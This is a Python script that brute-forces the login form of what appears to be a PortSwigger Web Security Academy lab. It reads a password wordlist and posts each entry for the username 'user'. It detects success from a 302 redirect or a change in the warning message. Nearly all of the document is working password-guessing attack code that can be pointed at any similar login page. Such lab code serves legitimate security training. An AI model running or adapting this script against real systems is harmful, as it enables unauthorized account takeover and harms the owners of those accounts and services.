import requests
import sys
from bs4 import BeautifulSoup

# Vulnerable Reponse! 
# <section>
# <p class=is-warning>Invalid username</p>
# <form class=login-form method=POST action="/login">
#     <label>Username</label>
#     <input required type=username name="username" autofocus>
#     <label>Password</label>
#     <input required type=password name="password">
#     <button class=button type=submit> Log in </button>
# </form>
# </section>

url = 'https://0a3100ea030412778064214d0030001e.web-security-academy.net/login'
wordlistPath = './password.txt'


#----------------------------------------------------------------

# Read user list from file and return list of usernames.
def readUserToList(wordlistPath):
    list = []
    try:
        with open(wordlistPath, 'r') as wordlist:
            for line in wordlist:
                list.append(line.strip()) #remove "/n"
            wordlist.close()
        return list
    except FileNotFoundError:
        print("Wordlist Not Found", wordlistPath)

passwordList = readUserToList(wordlistPath)
print("Testing User -> " , passwordList)

#----------------------------------------------------------------

# Test with a valid username and password
index = 0

for password in passwordList:

    payload = {
        'username':'user',
        'password':password
    }

    response = requests.post(url,payload,allow_redirects=False) #Notice: In default request will automatically redirect !

    #Check If login is successful!
    if (response.status_code == 302):
        print("Redirected to:", response.headers['Location'])
        print("May Login Scussfully! Password is:", password)
        sys.exit()
    
    
    soupParser = BeautifulSoup(response.text,'html.parser')
    grepExtract = soupParser.find('p',class_='is-warning')

    if grepExtract is not None:
        if (grepExtract.text != 'Incorrect password'):
            print("Valid Password Found!",index,"Grep->",grepExtract.text,password)
        else:
            print("Attempt req:", index, "Grep->",grepExtract.text,password)
    else:
        print("Warning tag not found")
        print("checkt Http response:",response.status_code)
        if (response.status_code == 302):
            print("Redirected to:", response.headers['Location'])
            print("May Login Scussfully! Password is:", password)
    index = index + 1
    

